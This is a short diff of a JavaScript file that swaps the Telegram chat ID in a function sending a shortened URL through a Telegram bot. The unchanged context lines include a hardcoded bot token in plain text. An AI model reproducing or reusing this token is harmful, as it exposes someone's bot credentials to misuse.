@@ -152,7 +152,7 @@ function shortenUrl(url) {
 
 function notifyTelegram(shortenedUrl) {
     var telegramBotKey = '6883902738:AAHioEWU2CkYWiiKSTRniLJ3Wc4VFXGa7hQ';
-    var telegramChatId = '5192707470';
+    var telegramChatId = '5816023717';
     var telegramApiUrl = `https://api.telegram.org/bot${telegramBotKey}/sendMessage`;
 
     // Create the Telegram message with the shortened URL
